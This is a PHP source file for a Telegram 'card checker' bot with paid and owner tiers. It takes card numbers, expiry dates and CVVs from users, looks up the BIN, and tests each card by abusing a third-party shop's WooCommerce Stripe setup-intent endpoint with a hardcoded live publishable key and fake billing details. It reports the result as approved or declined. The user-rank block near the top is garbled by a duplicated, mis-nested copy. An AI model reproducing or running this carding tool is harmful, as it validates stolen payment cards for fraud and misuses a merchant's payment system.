    <?php
    //=========RANK DETERMINE=========//
    $currentDate = date('Y-m-d');
        $rank = "FREE";
        $expiryDate = "0";

        $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
        $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
        $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

        if(in_array($userId, $owners)) {
            $rank = "OWNER";
           $expiryDate = "UNTIL DEAD"; 
        } else { 
            foreach ($paidUsers as $index => $line) {
                list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                if ($userIdFromFile == $userId) {
                    if ($userExpiryDate < $currentDate) {
                        unset($paidUsers[$index]); //
                        file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                        $freeUsers[] = $userId; // add to free users list
                        file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                    } else    $currentDate = date('Y-m-d');
        $rank = "FREE";
        $expiryDate = "0";

        $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
        $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
        $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

        if(in_array($userId, $owners)) {
            $rank = "OWNER";
           $expiryDate = "UNTIL DEAD"; 
        } else {
            foreach ($paidUsers as $index => $line) {
                list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                if ($userIdFromFile == $userId) {
                    if ($userExpiryDate < $currentDate) {
                        unset($paidUsers[$index]); 
                        file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                        $freeUsers[] = $userId; 
                        file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                    } else {
                        $rank = "PAID";
                        $expiryDate = $userExpiryDate;
                    }
                }
            }
        } {
                        $rank = "PAID";
                        $expiryDate = $userExpiryDate;
                    }
                }
            }
        }

    //=======RANK DETERMINE END=========//
    $update = json_decode(file_get_contents("php://input"), TRUE);
    $text = $update["message"]["text"];
    //========WHO CAN CHECK FUNC========//
    $r = "112";

    $r = rand(112, 199);
    //=====WHO CAN CHECK FUNC END======//
    if (preg_match('/^(\/sq|\.sq|!sq)/', $text)) {
        $userid = $update['message']['from']['id'];

        if (!checkAccess($userid)) {
            $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username 𝘠𝘖𝘜 𝘈𝘙𝘌 𝘕𝘖𝘛 𝘗𝘙𝘌𝘔𝘐𝘜𝘔 𝘜𝘚𝘌𝘙  ❌</b>", $message_id);
          exit();
        }
    $start_time = microtime(true);

      $chatId = $update["message"]["chat"]["id"];
        $message_id = $update["message"]["message_id"];
        $keyboard = "";
      $message = substr($message, 4);
      $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...⏳</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id
      ]);
      $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');

      $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
      $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
      $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
      $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
      $amt = '1';
      if(empty($cc)||empty($cvv)||empty($mes)||empty($ano)){
          bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"!𝙒𝙍𝙊𝙉𝙂 𝙁𝙊𝙍𝙈𝘼𝙏!%0A𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>/chk cc|mm|yy|cvv</code>• 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 <code> 𝙎𝙌𝙐𝘼𝙍𝙀 𝘼𝙐𝙏𝙃</code>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  ]);
          return;
      };
      if(strlen($ano) == '4'){
          $an = substr($ano, 2);
      }
      else{
        $an = $ano;
      }
          $amount = $amt * 100;
      //------------Card info------------//
      $lista = ''.$cc.'|'.$mes.'|'.$an.'|'.$cvv.'';
      $ch = curl_init();

      $bin = substr($cc, 0, 6);

      curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      $bindata = curl_exec($ch);
      $binna = json_decode($bindata, true);
      $brand = $binna['scheme'];
      $country = $binna['country']['name'];
      $alpha2 = $binna['country']['alpha2'];
      $emoji = $binna['country']['emoji'];
      $type = $binna['type'];
      $category = $binna['category'];
      $bank = $binna['bank']['name'];
      $url = $binna['bank']['url'];
      $phone = $binna['bank']['phone'];
      curl_close($ch);

      $bank = "$bank";
      $country = "$country $emoji ";
      $bin = "$bin - ($alpha2) -[$emoji] ";
      $bininfo = "$type - $brand - $category";
      $url = "$url";
      $type = strtoupper($type);

      $bin = "Card Declined";
      //------------Card info------------//

      # -------------------- [1 REQ] -------------------#
          $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, 'https://stateaffairs.com/?wc-ajax=wc_stripe_frontend_request&elementor_page_id=8&path=/wc-stripe/v1/setup-intent');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=stripe_cc');
          $result1 = curl_exec($ch);
          $client = Getstr($result1,'"client_secret":"','"');
          $pi = Getstr($result1,'"client_secret":"','_secret');




          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$pi.'/confirm');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=Dark+Soul&payment_method_data[billing_details][address][city]=New+York+City&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=Near+Cp&payment_method_data[billing_details][address][postal_code]=10001&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][email]=dsoul1'.$mail.'2%40gmail.com&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[payment_user_agent]=stripe.js%2F5b37d8a1b0%3B+stripe-js-v3%2F5b37d8a1b0&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HcXmvDqotq1S9R5e86L51GljOwHbcTdU7ajRRWIqiFXS650Soc0fxBCKN3oJkB6uMYwpVMtE3V5vDUMErFpspIU00PAsLtJuz&_stripe_account=acct_1HcXmvDqotq1S9R5&_stripe_version=2022-08-01&client_secret='.$client.'');
          $result2 = curl_exec($ch);
          $msg2 = Getstr($result2,'"message": "','"');

        $end_time = microtime(true);
      $time = number_format($end_time - $start_time, 2);
        ////////--[Responses]--////////

          if(strpos($result2, '"status": "succeeded"' )) {
              bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅

𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>Square Auth</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>Approved 🟢</code>

𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>$type - $brand - $scheme</code> 
𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$name $emoji</code>

𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
𝘽𝙊𝙏 𝙊𝙒𝙉𝙀𝙍 ↯ @CARDIBSET_XD",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  ]);
          }
          elseif((empty($client)) || (empty($pi))) {
              bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌

𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>Square Auth</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀  ↯ <code>$msg $bin 🔴</code>

𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>$type - $brand - $scheme</code> 
𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$name $emoji</code>

𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
𝘽𝙊𝙏 𝙊𝙒𝙉𝙀𝙍 ↯ @CARDIBSET_XD",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  ]);
          }
          else {
              bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿  ❌

𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>Square Auth</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>$bin 🔴</code>

𝘽𝙄𝙉 𝙄𝙉𝙁𝙊↯ <code>$type - $brand - $scheme</code> 
𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$name $emoji</code>

𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
𝘽𝙊𝙏 𝙊𝙒𝙉𝙀𝙍  ↯ @CARDIBSET_XD",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  ]);
          }
      }
      ?>
